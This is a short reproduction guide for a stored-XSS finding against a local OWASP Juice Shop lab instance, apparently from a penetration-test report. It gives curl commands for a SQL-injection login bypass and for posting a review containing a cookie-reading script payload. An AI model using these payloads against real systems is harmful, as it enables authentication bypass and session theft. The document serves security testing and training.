# Manual Reproduction Workflow - F-002 Stored XSS

## Prerequisites
- Juice Shop running at http://localhost:3000
- curl installed

## Steps

### 1. Authenticate
```bash
TOKEN=$(curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"x"}' | \
  python3 -c "import sys,json; print(json.loads(sys.stdin.read())['authentication']['token'])")
```

### 2. Inject payload
```bash
curl -s -X PUT http://localhost:3000/rest/products/1/reviews \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"message":"<script>alert(document.cookie)</script>","author":"attacker"}'
```

### 3. Verify storage
```bash
curl -s http://localhost:3000/rest/products/1/reviews | python3 -m json.tool
```

### 4. Browser exploitation
Navigate to: http://localhost:3000/#/product/1
Observe: alert dialog executes with cookie content
